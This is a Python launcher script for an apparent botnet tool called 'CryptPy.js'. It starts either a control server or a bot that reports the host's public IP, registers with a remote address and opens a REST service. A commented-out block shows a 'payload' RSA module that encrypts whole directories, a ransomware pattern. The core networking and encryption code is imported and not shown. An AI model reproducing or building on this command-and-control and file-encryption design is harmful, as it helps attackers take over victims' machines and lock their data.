import argparse
import ipgetter
import OpenSSL
import rest_shell
from src.common.commondefs import true
from src.common.commondefs import none
from src.networking import server
from src.networking import client
from src.bot import bot

#from payload.rsa.rsa import RSA
"""
# SYNTAX FOR RSA MODULE
# Setup
key_name = "3b4e434"
payload = RSA(key_name)
# To encrypt a dir:
payload.encrypt("payload/rsa/test_files") # Dont put a slash at the end of the path
# To decrypt a dir:
payload.decrypt("payload/rsa/test_files")
"""

def main():
    parser = argparse.ArgumentParser(description='start CryptPy.js') # Init parser

    parser.add_argument('--server', action='store_true', help='Starts CryptPy.js in server mode') # Add server argument
    parser.add_argument('--terminal', action='store_true', help='Starts server in terminal mode') # Add terminal argument
    parser.add_argument('--remoteaddr', metavar='remoteaddr', type=str) # Add server argument
    parser.add_argument('--port', metavar='port', type=int) # Add port argument
    parser.add_argument('--test', action='store_true', help='Starts server in test mode') # Add test arg

    args = parser.parse_args() # Fetch arguments

    if args.server == true:
        if args.terminal == true:
            server.Server("terminal", args.port) # Init server

            if args.test == true:
                raise SystemExit(0) # Success
        else:
            server.Server("", args.port) # Init server

            if args.test == true:
                raise SystemExit(0) # Success
    else:
        self_bot = bot.Bot

        self_bot = bot.Bot(ipgetter.myip(), args.port) # Init bot

        client.Client(self_bot, args.remoteaddr, args.port) # Init and register client

        self_bot.rest() # Start rest server

    # TODO: add random port usage for better upnp integration

main()